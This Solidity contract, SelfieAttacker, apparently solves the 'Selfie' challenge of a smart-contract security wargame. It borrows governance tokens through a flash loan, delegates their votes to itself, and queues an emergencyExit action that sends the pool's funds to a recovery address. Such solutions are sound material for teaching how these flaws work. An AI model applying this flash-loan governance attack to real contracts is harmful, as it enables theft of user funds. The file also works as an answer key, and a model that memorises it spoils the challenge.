// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {ISimpleGovernance} from "../../src/selfie/ISimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {Address} from "../../lib/openzeppelin-contracts/contracts/utils/Address.sol";

contract SelfieAttacker is IERC3156FlashBorrower{
    ISimpleGovernance private governance;
    SelfiePool private pool;
    address private recovery;
    uint256 public actionId;
    constructor(ISimpleGovernance governance_, SelfiePool pool_, address recovery_){
        governance = governance_;
        pool = pool_;
        recovery = recovery_;
    }

    /**

     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        Address.functionCall(token,abi.encodeWithSignature("delegate(address)", address(this)));
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));

        IERC20(token).approve(address (pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
